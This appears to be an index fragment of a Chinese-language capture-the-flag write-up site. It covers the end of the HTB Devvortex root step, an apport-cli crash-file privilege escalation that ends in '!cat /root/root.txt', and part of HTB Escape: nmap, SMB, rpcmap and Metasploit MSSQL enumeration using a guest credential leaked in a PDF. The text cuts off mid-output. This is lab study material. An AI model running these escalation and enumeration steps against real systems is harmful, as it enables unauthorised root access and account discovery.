<p>\u67e5\u770bapport\u7684\u6587\u6863\u53ef\u53d1\u73b0\uff0c\u5f53\u6536\u5230\u201cSIGSEGV\u201d\u7b49\u4fe1\u53f7\u65f6\u53ef</p> <p>It currently supports - Crashes from standard signals (SIGSEGV, SIGILL, etc.) through the kernel coredump handler (in piping mode)</p> <p>ChatGPT\u8be2\u95ee\u5982\u4f55\u53d1\u9001\u201cSIGSEGV\u201d\u4fe1\u53f7\u540e\uff0c\u5f97\u77e5\u53ef\u4ee5kill\u4e00\u4e2a\u8fdb\u7a0b\u3002\u4e00\u4e2a\u7b80\u5355\u7684\u65b9\u5f0f\u5c31\u662f\u540e\u53f0\u8fd0\u884c\u4e00\u4e2asleep\u547d\u4ee4\uff0c\u7136\u540e\u5bf9\u5176\u53d1\u9001\u4fe1\u53f7\uff1a <pre><code>logan@devvortex:~$ sleep 1000 &amp;\n[1] 9073\nlogan@devvortex:~$ ps\n    PID TTY          TIME CMD\n   1816 pts/2    00:00:00 bash\n   9073 pts/2    00:00:00 sleep\n   9100 pts/2    00:00:00 ps\nlogan@devvortex:~$ kill -11 9073\nlogan@devvortex:~$ ps\n    PID TTY          TIME CMD\n   1816 pts/2    00:00:00 bash\n   9564 pts/2    00:00:00 ps\n[1]+  Segmentation fault      (core dumped) sleep 1000\nlogan@devvortex:~$ ls /var/crash/\n_usr_bin_sleep.1000.crash\n</code></pre></p> <p>\u987a\u4fbf\u770b\u4e00\u773ckill\u7684\u5404\u79cd\u4fe1\u53f7\uff1a <pre><code>logan@devvortex:~$ kill -l\n 1) SIGHUP       2) SIGINT       3) SIGQUIT      4) SIGILL       5) SIGTRAP\n 6) SIGABRT      7) SIGBUS       8) SIGFPE       9) SIGKILL     10) SIGUSR1\n11) SIGSEGV     12) SIGUSR2     13) SIGPIPE     14) SIGALRM     15) SIGTERM\n16) SIGSTKFLT   17) SIGCHLD     18) SIGCONT     19) SIGSTOP     20) SIGTSTP\n21) SIGTTIN     22) SIGTTOU     23) SIGURG      24) SIGXCPU     25) SIGXFSZ\n26) SIGVTALRM   27) SIGPROF     28) SIGWINCH    29) SIGIO       30) SIGPWR\n31) SIGSYS      34) SIGRTMIN    35) SIGRTMIN+1  36) SIGRTMIN+2  37) SIGRTMIN+3\n38) SIGRTMIN+4  39) SIGRTMIN+5  40) SIGRTMIN+6  41) SIGRTMIN+7  42) SIGRTMIN+8\n43) SIGRTMIN+9  44) SIGRTMIN+10 45) SIGRTMIN+11 46) SIGRTMIN+12 47) SIGRTMIN+13\n48) SIGRTMIN+14 49) SIGRTMIN+15 50) SIGRTMAX-14 51) SIGRTMAX-13 52) SIGRTMAX-12\n53) SIGRTMAX-11 54) SIGRTMAX-10 55) SIGRTMAX-9  56) SIGRTMAX-8  57) SIGRTMAX-7\n58) SIGRTMAX-6  59) SIGRTMAX-5  60) SIGRTMAX-4  61) SIGRTMAX-3  62) SIGRTMAX-2\n63) SIGRTMAX-1  64) SIGRTMAX\n</code></pre></p> <p>\u53e6\u5916\uff0c\u8fd9\u79cd\u5f62\u5f0f\u4e5f\u884c\uff1a<code>killall -SIGSEGV sleep</code></p> <p>\u6709crash\u6587\u4ef6\u5c31\u597d\u529e\u4e86\uff0c\u63a5\u4e0b\u6765\u6839\u636ePoC\u8fd0\u884c <code>sudo apport-cli -c /var/crash/_usr_bin_sleep.1000.crash</code>\uff0c\u7136\u540e\u76f4\u63a5\u201c!\u201d\u8c03\u7528\u547d\u4ee4\u5373\u53ef\uff1a <pre><code> (...)\n!id\nuid=0(root) gid=0(root) groups=0(root)\n!done  (press RETURN)\n</code></pre></p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Devvortex/#flag-root","title":"flag: root","text":"<pre><code> (...)\n!cat /root/root.txt\n768c (...) 2781\n!done  (press RETURN)\n</code></pre>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Devvortex/#_3","title":"\u603b\u7ed3\u00b7\u540e\u8bb0","text":"<p>2023/11/28</p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Escape/","title":"HTB-Escape","text":"<p>\u7b2c\u4e00\u6b21\u6253Windows\u7684\u9776\u673a\u2026\u2026\u4e5f\u662f\u8fb9\u6253\u8fb9\u5b66\u4e86\u3002</p>","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Escape/#summary","title":"Summary","text":"<p>...</p>","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Escape/#attack-path-overview","title":"Attack Path Overview","text":"","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Escape/#_1","title":"\u626b\u63cf","text":"<p>\u7531\u4e8e\u662fWindows\u673a\u5668\u4e14\u662fMedium\uff0c\u59d1\u4e14\u626b\u4e00\u4e0b\u5168\u7aef\u53e3\u5427</p> <pre><code>\u2514\u2500$ export HTB_IP=10.10.11.202\n\u2514\u2500$ sudo nmap -n -Pn -sS -p- --min-rate=10000 ${HTB_IP} | tee ${HTB_IP}_ports_all.nmap\n\u2514\u2500$ export ports=$(cat \"${HTB_IP}_ports_all.nmap\" | grep ^[0-9] | cut -d / -f1 | tr '\\n' ',' | sed s/,$//)\n\u2514\u2500$ echo $ports\n53,88,135,139,389,445,464,593,636,1433,3268,3269,5985,9389,49667,49687,49688,49705,49709,52722\n\n\u2514\u2500$ sudo nmap -v -n -Pn -sV -O -p ${ports} ${HTB_IP} | tee \"${HTB_IP}_baseScan.nmap\"\n\u2026\u2026\nPORT      STATE SERVICE       VERSION\n53/tcp    open  domain        Simple DNS Plus\n88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-06-01 09:36:12Z)\n135/tcp   open  msrpc         Microsoft Windows RPC\n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)\n445/tcp   open  microsoft-ds?\n464/tcp   open  kpasswd5?\n593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)\n1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000\n3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)\n3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)\n5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n9389/tcp  open  mc-nmf        .NET Message Framing\n49667/tcp open  msrpc         Microsoft Windows RPC\n49687/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n49688/tcp open  msrpc         Microsoft Windows RPC\n49705/tcp open  msrpc         Microsoft Windows RPC\n49709/tcp open  msrpc         Microsoft Windows RPC\n52722/tcp open  msrpc         Microsoft Windows RPC\n\n\u2514\u2500$ sudo nmap -n -Pn -sU --top-ports 20 ${HTB_IP} | tee \"${HTB_IP}_ports_udp_top20.nmap\"\nPORT      STATE         SERVICE\n53/udp    open          domain\n67/udp    open|filtered dhcps\n68/udp    open|filtered dhcpc\n69/udp    open|filtered tftp\n123/udp   open          ntp\n135/udp   open|filtered msrpc\n137/udp   open|filtered netbios-ns\n138/udp   open|filtered netbios-dgm\n139/udp   open|filtered netbios-ssn\n161/udp   open|filtered snmp\n162/udp   open|filtered snmptrap\n445/udp   open|filtered microsoft-ds\n500/udp   open|filtered isakmp\n514/udp   open|filtered syslog\n520/udp   open|filtered route\n631/udp   open|filtered ipp\n1434/udp  open|filtered ms-sql-m\n1900/udp  open|filtered upnp\n4500/udp  open|filtered nat-t-ike\n49152/udp open|filtered unknown\n</code></pre> <p>vuln\u811a\u672c\u626b\u63cf\u6ca1\u4ec0\u4e48\u7ed3\u679c\u3002</p>","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Escape/#_2","title":"\u7aef\u53e3\u5206\u6790\u3001\u653b\u51fb\u8def\u5f84\u89c4\u5212","text":"<p>\u6709DNS\u3001Kerberos\u3001LDAP\uff0c\u5e94\u8be5\u662f\u4e2a\u57df\u63a7\uff1f \u57df\u540d\u7591\u4f3c\u8fd9\u4e2a\uff1asequel.htb0\uff08\u540e\u786e\u8ba4\u4e3a\u201csequel.htb\u201d\uff09</p> <p>\u611f\u89c9\u53ef\u4ee5\u53c2\u8003\u8fd9\u4e2aAPT\u9776\u673a\u3002\u5148\u770b\u770b445\u548c135\u6709\u4ec0\u4e48\u4fe1\u606f\u3002 \u7136\u540e\u67091433\u7684SQL\uff0c\u6253\u8fdb\u53bb\u4e4b\u540e\u53ef\u80fd\u53ef\u4ee5\u679a\u4e3eLDAP\uff1f</p>","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Escape/#445","title":"445\u7aef\u53e3","text":"<p>\u770b\u4e00\u4e0b\u5171\u4eab\u5217\u8868 <pre><code>\u2514\u2500$ smbclient -L //${HTB_IP}\nPassword for [WORKGROUP\\kali]:\n\n        Sharename       Type      Comment\n        ---------       ----      -------\n        ADMIN$          Disk      Remote Admin\n        C$              Disk      Default share\n        IPC$            IPC       Remote IPC\n        NETLOGON        Disk      Logon server share \n        Public          Disk      \n        SYSVOL          Disk      Logon server share\n</code></pre></p> <p>\u4ece <code>/Public</code> \u4e0b\u8f7d\u4e86\u4e00\u4e2aPDF\uff0c\u5176\u4ed6\u5171\u4eab\u6ca1\u6709\u4ec0\u4e48\u4fe1\u606f\u3002</p> <p></p>","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Escape/#sql","title":"\u83b7\u5f97SQL\u4e34\u65f6\u51ed\u636e","text":"<p>PDF\u6700\u4e0b\u9762\u6709\u4e34\u65f6\u51ed\u636e\uff08PublicUser:GuestUserCantWrite1\uff09\uff0c\u800c\u7aef\u53e31433\u5c31\u662fSQL\uff0c\u7b49\u4e0b\u5c1d\u8bd5\u80fd\u5426\u5229\u7528\u3002</p> <p>\u5148\u7ee7\u7eed\u770b\u770b135\u3002</p>","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Escape/#135","title":"135\u7aef\u53e3","text":"","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Escape/#rpcclient","title":"rpcclient","text":"<pre><code>\u2514\u2500$ rpcclient ${HTB_IP}\nPassword for [WORKGROUP\\kali]:\nBad SMB2 (sign_algo_id=1) signature for message\n[0000] 00 00 00 00 00 00 00 00   00 00 00 00 00 00 00 00   ........ ........\n[0000] 4B D2 65 70 56 9D 82 DD   D0 D2 F9 26 F1 45 D7 66   K.epV... ...&amp;.E.f\nCannot connect to server.  Error was NT_STATUS_ACCESS_DENIED\n\n\u2514\u2500$ rpcclient ${HTB_IP} -p 135\nCannot connect to server.  Error was NT_STATUS_IO_TIMEOUT\n</code></pre>","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Escape/#impacket-rpcdumppy","title":"(impacket) rpcdump.py","text":"<p>\u4e3a\u4e86\u65b9\u4fbf\uff0c\u5148\u4fee\u6539PATH\uff0c\u628aimpacket\u7684\u8def\u5f84\u52a0\u8fdb\u6765\uff1a <pre><code>\u2514\u2500$ which rpcdump rpcdump.py\nrpcdump not found\nrpcdump.py not found\n\u2514\u2500$ echo $PATH                   \n/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games\n\n\u2514\u2500$ export PATH=/usr/share/doc/python3-impacket/examples:$PATH\n\n\u2514\u2500$ echo $PATH                                                \n/usr/share/doc/python3-impacket/examples:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games\n\u2514\u2500$ which rpcdump rpcdump.py\nrpcdump not found\n/usr/share/doc/python3-impacket/examples/rpcdump.py\n</code></pre></p> <p>\u6267\u884c\uff1a<code>rpcdump.py ${HTB_IP} | tee ${HTB_IP}_rpcdump.txt</code> \u7ed3\u679c\u8fc7\u4e8e\u957f\u5c31\u4e0d\u7c98\u8d34\u4e86\u2026\u2026</p> <p>\u60f3\u60f3\u5176\u5b9e\u8fd9\u4e00\u6b65\u5bf9\u6211\u6765\u8bf4\u4e5f\u6ca1\u6709\u592a\u5927\u610f\u4e49\uff0c\u53ef\u4ee5\u76f4\u63a5\u8dd1 <code>rpcmap</code> \u7684\u3002</p>","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Escape/#impacket-rpcmappy","title":"(impacket) rpcmap.py","text":"<pre><code>\u2514\u2500$ rpcmap.py ncacn_ip_tcp:${HTB_IP}[135] | tee ${HTB_IP}_rpcmap.txt\n\n\u2514\u2500$ rpcmap.py ncacn_ip_tcp:${HTB_IP}[135] -brute-uuids -brute-opnums | tee ${HTB_IP}_rpcmap_BF.txt\n</code></pre> <p>\u9664\u53bb\u201cOpnums 0-64: rpc_s_access_denied\u201d\u548c\u5176\u4ed6\u5931\u8d25\u7684\uff0c\u6709\u663e\u793a\u6210\u529f\u7684\u5269\u4e0b2\u4e2a\uff1a <pre><code>Protocol: [MS-DCOM]: Distributed Component Object Model (DCOM) Remote\nProvider: rpcss.dll\nUUID: 99FCFEC4-5260-101B-BBCB-00AA0021347A v0.0\nOpnum 0: rpc_x_bad_stub_data\nOpnum 1: rpc_x_bad_stub_data\nOpnum 2: rpc_x_bad_stub_data\nOpnum 3: success\nOpnum 4: rpc_x_bad_stub_data\nOpnum 5: success\nOpnums 6-64: nca_s_op_rng_error (opnum not found)\n\nProtocol: [MS-RPCE]: Remote Management Interface\nProvider: rpcrt4.dll\nUUID: AFA8BD80-7D8A-11C9-BEF4-08002B102989 v1.0\nOpnum 0: success\nOpnum 1: rpc_x_bad_stub_data\nOpnum 2: success\nOpnum 3: success\nOpnum 4: rpc_x_bad_stub_data\nOpnums 5-64: nca_s_op_rng_error (opnum not found)\n</code></pre></p> <p>\u8c37\u6b4c\u4e00\u4e0b99FCFEC4-5260-101B-BBCB-00AA0021347A\u53ef\u4ee5\u770b\u5230MS\u7684\u6587\u6863\uff0c\u800cOpnum 3\u548c5\uff1aServerAlive\u3002</p> <p>\u6839\u636e\u4e0a\u8ff0\u6587\u6863\u7684\u540d\u79f0\uff0c\u641c\u201cIObjectExporter ServerAlive exploit\u201d\u80fd\u53d1\u73b0\u8fd9\u7bc7\u6587\u7ae0\u3002\u4f3c\u4e4e\u5c31\u662f\u679a\u4e3eIPv6\u7684\uff0c\u91cc\u9762\u6709python\u811a\u672c\u3002 \u6267\u884c\u7ed3\u679c\uff1a <pre><code>\u2514\u2500$ python OXIDResolver.py        \n[*] Retrieving network interface of 10.10.11.202\nAddress: dc\nAddress: 10.10.11.202\nAddress: dead:beef::3d3e:78e9:cea8:eac3\nAddress: dead:beef::1dc\n</code></pre></p> <p>nmap\u626b\u63cf\u4e00\u4e0b\u7aef\u53e3\uff0c\u7ed3\u679c\u548c\u4e4b\u524d\u7684\u626b\u63cf\u6ca1\u592a\u5927\u5dee\u522b\u3002 \u6839\u636eAPT\u9776\u673a\u7684\u5957\u8def\u5148\u8d70\u5230\u8fd9\uff0c\u611f\u89c9\u8fd9\u6761\u8def\u5e94\u8be5\u4e0d\u592a\u5bf9\uff0c\u5269\u4e0b\u90a3\u4e2aUUID\u5148\u653e\u4e00\u653e\u3002  </p> <p>\u5148\u770b\u770b\u90a3\u4e2aSQL\u51ed\u636e\u80fd\u5426\u5229\u7528\u2026\u2026</p>","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Escape/#1433","title":"1433\u7aef\u53e3","text":"<p>\u6839\u636enmap\u7684\u7248\u672c\u626b\u63cf\u7ed3\u679c\uff0c\u5c1d\u8bd5\u641c\u7d22\u201cMicrosoft SQL Server 2019 exploit\u201d\u53d1\u73b0hacktricks\u7684\u6587\u7ae0\uff0c\u5148\u6309\u7167\u91cc\u9762\u7684\u5185\u5bb9\u8bd5\u8bd5\u3002</p>","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Escape/#nes","title":"NES\u626b\u63cf\u5931\u8d25","text":"<p>\u4e00\u5f00\u59cb\u76f4\u63a5\u62a5\u9519\u8fd8\u4ee5\u4e3a\u4e0d\u884c\uff0c\u4ed4\u7ec6\u770b\u4e86\u4e0b\u8bf4\u53ef\u4ee5\u52a0\u4e0a <code>-Pn</code>\u3002\u4e0d\u8fc7\u6700\u540e\u7ed3\u679c\u4f9d\u65e7\u662f\u201cERROR: Script execution failed\u201d\u3002 \u540e\u6765\u5728 <code>mssql.instance-name</code> \u8bbe\u7f6e\u4e86\u4e00\u4e0b\u201cSQLMOCK\u201d\u6216\u8005\u201cmaster\u201d\uff0c\u4e0d\u8fc7\u8fd0\u884c\u7ed3\u679c\u4e00\u6837\u5931\u8d25\u3002 memo\uff1a\u6bcf\u4e2a\u5b9e\u4f8b\u62e5\u6709\u81ea\u5df1\u72ec\u7acb\u7684IP&amp;\u7aef\u53e3\u7ec4\u5408\uff0c\u53ef\u4ee5\u8fd0\u884c\u591a\u4e2a\u6570\u636e\u5e93\u3002</p> <pre><code>\u2514\u2500$ nmap -v -Pn --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=PublicUser,mssql.password=GuestUserCantWrite1,mssql.instance-name=MSSQLSERVER -sV -p 1433 ${HTB_IP} | tee ${HTB_IP}_1433_enum.nmap \n\u2026\u2026\nPORT     STATE SERVICE  VERSION\n1433/tcp open  ms-sql-s Microsoft SQL Server 2019 15.00.2000.00; RTM\n|_ms-sql-empty-password: ERROR: Script execution failed (use -d to debug)\n|_ms-sql-info: ERROR: Script execution failed (use -d to debug)\n\u2026\u2026\n</code></pre>","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Escape/#metasploit","title":"metasploit\u626b\u63cf","text":"<p>msf\u626b\u63cf\u9700\u8981\u51ed\u636e\uff0c\u800c\u4e4b\u524d\u6b63\u597d\u6536\u96c6\u5230\u4e86SQL\u4e34\u65f6\u51ed\u636e\u3002</p> <p>\u7531\u4e8e\u7528\u5230\u7684\u6a21\u5757\u6709\u70b9\u591a\uff0c\u5148\u914d\u7f6e\u4e00\u4e0b\u5168\u5c40\u53c2\u6570\u4f1a\u65b9\u4fbf\u5f88\u591a\uff1a <pre><code>setg rhosts 10.10.11.202\nsetg username PublicUser\nsetg password GuestUserCantWrite1\n</code></pre></p>","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Escape/#msf-use-adminmssqlmssql_enum","title":"msf&gt; use admin/mssql/mssql_enum","text":"","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Escape/#_3","title":"\u4fe1\u606f\u6574\u7406","text":"<p>2\u4e2a\u7528\u6237\uff1a</p> <ul> <li>sa\uff08\u8fd9\u8fd8\u662fSystem Admin\uff1f\u4f46\u662f\u8fd9\u597d\u50cf\u662fmsf\u6a21\u5757\u7684\u9ed8\u8ba4\u503c\uff0c\u4e4b\u524d\u7684\u8bef\u64cd\u4f5c\u76f4\u63a5run\u4e86\u4e00\u4e0b\u3002\u4e3a\u4ec0\u4e48\u5c31\u7b97System Admin\u4e86\uff1f\uff09 <ul> <li>\u540e\u6765\u641c\u4e86\u4e00\u4e0b\uff0c\u8fd9\u662fSQL Server\u7528\u6765\u7ba1\u7406SQL\u8d26\u6237\u7684\uff0c\u4e00\u4e2a\u9ad8\u6743\u9650\u4f46\u662f\u4e00\u822c\u9ed8\u8ba4\u7981\u7528\u7684\u8d26\u6237\u3002\u53c2\u8003link\uff08\u65e5\u6587\uff09</li> </ul> </li> <li>PublicUser\uff08\u5373\u4e34\u65f6\u51ed\u636e\uff09</li> </ul> <p>4\u4e2a\u6570\u636e\u5e93\uff1a</p> <ul> <li>master</li> <li>tempdb</li> <li>model</li> <li>msdb</li> </ul> <p>\u770bhacktricks\u4e86\u89e3\u5230\u8fd9\u662fMSSQL\u7684\u9ed8\u8ba4\u6570\u636e\u5e93</p> <p>\u5173\u4e8eStored Procedures\u3002\u8bb0\u5f97\u4ee5\u524d\u597d\u50cf\u5728\u54ea\u91cc\u770b\u8fc7\u5229\u7528\u6765\u7740\uff0c\u59d1\u4e14\u4e5f\u628a\u626b\u63cf\u7ed3\u679c\u8bb0\u4e0b\u6765\u3002</p>","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Escape/#_4","title":"\u626b\u63cf\u7ed3\u679c","text":"<pre><code>[*] 10.10.11.202:1433 - Databases on the server:\n[*] 10.10.11.202:1433 -         Database name:master\n[*] 10.10.11.202:1433 -         Database Files for master:\n[*] 10.10.11.202:1433 -                 C:\\Program Files\\Microsoft SQL Server\\MSSQL15.SQLMOCK\\MSSQL\\DATA\\master.mdf\n[*] 10.10.11.202:1433 -                 C:\\Program Files\\Microsoft SQL Server\\MSSQL15.SQLMOCK\\MSSQL\\DATA\\mastlog.ldf\n[*] 10.10.11.202:1433 -         Database name:tempdb\n[*] 10.10.11.202:1433 -         Database Files for tempdb:\n[*] 10.10.11.202:1433 -                 C:\\Program Files\\Microsoft SQL Server\\MSSQL15.SQLMOCK\\MSSQL\\DATA\\tempdb.mdf\n[*] 10.10.11.202:1433 -                 C:\\Program Files\\Microsoft SQL Server\\MSSQL15.SQLMOCK\\MSSQL\\DATA\\templog.ldf\n[*] 10.10.11.202:1433 -         Database name:model\n[*] 10.10.11.202:1433 -         Database Files for model:\n[*] 10.10.11.202:1433 -         Database name:msdb\n[*] 10.10.11.202:1433 -         Database Files for msdb:\n[*] 10.10.11.202:1433 -                 C:\\Program Files\\Microsoft SQL Server\\MSSQL15.SQLMOCK\\MSSQL\\DATA\\MSDBData.mdf\n[*] 10.10.11.202:1433 -                 C:\\Program Files\\Microsoft SQL Server\\MSSQL15.SQLMOCK\\MSSQL\\DATA\\MSDBLog.ldf\n[*] 10.10.11.202:1433 - System Logins on this Server:\n[*] 10.10.11.202:1433 -         sa\n[*] 10.10.11.202:1433 -         PublicUser\n[*] 10.10.11.202:1433 - Disabled Accounts:\n[*] 10.10.11.202:1433 -         No Disabled Logins Found\n[*] 10.10.11.202:1433 - No Accounts Policy is set for:\n[*] 10.10.11.202:1433 -         All System Accounts have the Windows Account Policy Applied to them.\n[*] 10.10.11.202:1433 - Password Expiration is not checked for:\n[*] 10.10.11.202:1433 -         sa\n[*] 10.10.11.202:1433 -         PublicUser\n[*] 10.10.11.202:1433 - System Admin Logins on this Server:\n[*] 10.10.11.202:1433 -         sa\n\u2026\u2026\n[*] 10.10.11.202:1433 - Stored Procedures with Public Execute Permission found:\n[*] 10.10.11.202:1433 -         sp_replsetsyncstatus\n[*] 10.10.11.202:1433 -         sp_replcounters\n[*] 10.10.11.202:1433 -         sp_replsendtoqueue\n[*] 10.10.11.202:1433 -         sp_resyncexecutesql\n[*] 10.10.11.202:1433 -         sp_prepexecrpc\n[*] 10.10.11.202:1433 -         sp_repltrans\n[*] 10.10.11.202:1433 -         sp_xml_preparedocument\n[*] 10.10.11.202:1433 -         xp_qv\n[*] 10.10.11.202:1433 -         xp_getnetname\n[*] 10.10.11.202:1433 -         sp_releaseschemalock\n[*] 10.10.11.202:1433 -         sp_refreshview\n[*] 10.10.11.202:1433 -         sp_replcmds\n[*] 10.10.11.202:1433 -         sp_unprepare\n[*] 10.10.11.202:1433 -         sp_resyncprepare\n[*] 10.10.11.202:1433 -         sp_createorphan\n[*] 10.10.11.202:1433 -         xp_dirtree\n[*] 10.10.11.202:1433 -         sp_replwritetovarbin\n[*] 10.10.11.202:1433 -         sp_replsetoriginator\n[*] 10.10.11.202:1433 -         sp_xml_removedocument\n[*] 10.10.11.202:1433 -         sp_repldone\n[*] 10.10.11.202:1433 -         sp_reset_connection\n[*] 10.10.11.202:1433 -         xp_fileexist\n[*] 10.10.11.202:1433 -         xp_fixeddrives\n[*] 10.10.11.202:1433 -         sp_getschemalock\n[*] 10.10.11.202:1433 -         sp_prepexec\n[*] 10.10.11.202:1433 -         xp_revokelogin\n[*] 10.10.11.202:1433 -         sp_execute_external_script\n[*] 10.10.11.202:1433 -         sp_resyncuniquetable\n[*] 10.10.11.202:1433 -         sp_replflush\n[*] 10.10.11.202:1433 -         sp_resyncexecute\n[*] 10.10.11.202:1433 -         xp_grantlogin\n[*] 10.10.11.202:1433 -         sp_droporphans\n[*] 10.10.11.202:1433 -         xp_regread\n[*] 10.10.11.202:1433 -         sp_getbindtoken\n[*] 10.10.11.202:1433 -         sp_replincrementlsn\n[*] 10.10.11.202:1433 - Instances found on this server:\n[*] 10.10.11.202:1433 - Default Server Instance SQL Server Service is running under the privilege of:\n[*] 10.10.11.202:1433 -         xp_regread might be disabled in this system\n</code></pre>","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Escape/#msf-use-adminmssqlmssql_enum_domain_accounts","title":"msf&gt; use admin/mssql/mssql_enum_domain_accounts","text":"","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Escape/#_5","title":"\u4fe1\u606f\u6574\u7406","text":"<ul> <li>SQL Server Name: DC</li> <li>Domain Name: sequel</li> <li>31\u4e2a\u8d26\u6237\uff08user accounts, groups, and computer accounts\uff09</li> <li>\u6ce8\u610f\u5230hacktricks\u7684from-db_owner-to-sysadmin\uff0c\u4e0d\u77e5\u9053\u80fd\u5426\u5229\u7528</li> </ul>","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Escape/#_6","title":"\u626b\u63cf\u7ed3\u679c","text":"<pre><code>[*] 10.10.11.202:1433 - SQL Server Name: DC\n[*] 10.10.11.202:1433 - Domain Name: sequel\n[+] 10.10.11.202:1433 - Found the domain sid: 0105000000000005150000009d2c17f321e7f058e9821299\n[*] 10.10.11.202:1433 - Brute forcing 10000 RIDs through the SQL Server, be patient...\n[*] 10.10.11.202:1433 -  - sequel\\Administrator\n[*] 10.10.11.202:1433 -  - sequel\\Guest\n[*] 10.10.11.202:1433 -  - sequel\\krbtgt\n[*] 10.10.11.202:1433 -  - sequel\\Domain Admins\n[*] 10.10.11.202:1433 -  - sequel\\Domain Users\n[*] 10.10.11.202:1433 -  - sequel\\Domain Guests\n[*] 10.10.11.202:1433 -  - sequel\\Domain Computers\n[*] 10.10.11.202:1433 -  - sequel\\Domain Controllers\n[*] 10.10.11.202:1433 -  - sequel\\Cert Publishers\n[*] 10.10.11.202:1433 -  - sequel\\Schema Admins\n[*] 10.10.11.202:1433 -  - sequel\\Enterprise Admins\n[*] 10.10.11.202:1433 -  - sequel\\Group Policy Creator Owners\n[*] 10.10.11.202:1433 -  - sequel\\Read-only Domain Controllers\n[*] 10.10.11.202:1433 -  - sequel\\Cloneable Domain Controllers\n[*] 10.10.11.202:1433 -  - sequel\\Protected Users\n[*] 10.10.11.202:1433 -  - sequel\\Key Admins\n[*] 10.10.11.202:1433 -  - sequel\\Enterprise Key Admins\n[*] 10.10.11.202:1433 -  - sequel\\RAS and IAS Servers\n[*] 10.10.11.202:1433 -  - sequel\\Allowed RODC Password Replication Group\n[*] 10.10.11.202:1433 -  - sequel\\Denied RODC Password Replication Group\n[*] 10.10.11.202:1433 -  - sequel\\DC$\n[*] 10.10.11.202:1433 -  - sequel\\DnsAdmins\n[*] 10.10.11.202:1433 -  - sequel\\DnsUpdateProxy\n[*] 10.10.11.202:1433 -  - sequel\\Tom.Henn\n[*] 10.10.11.202:1433 -  - sequel\\Brandon.Brown\n[*] 10.10.11.202:1433 -  - sequel\\Ryan.Cooper\n[*] 10.10.11.202:1433 -  - sequel\\sql_svc\n[*] 10.10.11.202:1433 -  - sequel\\James.Roberts\n[*] 10.10.11.202:1433 -  - sequel\\Nicole.Thompson\n[*] 10.10.11.202:1433 -  - sequel\\SQLServer2005SQLBrowserUser$DC\n[+] 10.10.11.202:1433 - 31 user accounts, groups, and computer accounts were found.\n</code></pre>","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Escape/#msf-use-adminmssqlmssql_enum_sql_logins","title":"msf&gt; use admin/mssql/mssql_enum_sql_logins","text":"","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Escape/#_7","title":"\u4fe1\u606f\u6574\u7406","text":"<ul> <li>\u4e0d\u77e5\u9053\u5e26\u4e95\u53f7\u7684\u7528\u6237\u662f\u600e\u4e48\u56de\u4e8b</li> <li>sequel\\Administrator\u767b\u9646\u8fc7\u8fd9\u4e2a\u7684\u610f\u601d\uff1f\u4e0d\u77e5\u9053\u4f1a\u4e0d\u4f1a\u7559\u4e0b\u51ed\u636e\u80fd\u5229\u7528\u4ec0\u4e48\u7684</li> </ul>","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Escape/#_8","title":"\u626b\u63cf\u7ed3\u679c","text":"<pre><code>[+] 10.10.11.202:1433 - 17 SQL Server logins were verified:\n[*] 10.10.11.202:1433 -  - ##MS_AgentSigningCertificate##\n[*] 10.10.11.202:1433 -  - ##MS_PolicyEventProcessingLogin##\n[*] 10.10.11.202:1433 -  - ##MS_PolicySigningCertificate##\n[*] 10.10.11.202:1433 -  - ##MS_PolicyTsqlExecutionLogin##\n[*] 10.10.11.202:1433 -  - ##MS_SQLAuthenticatorCertificate##\n[*] 10.10.11.202:1433 -  - ##MS_SQLReplicationSigningCertificate##\n[*] 10.10.11.202:1433 -  - ##MS_SQLResourceSigningCertificate##\n[*] 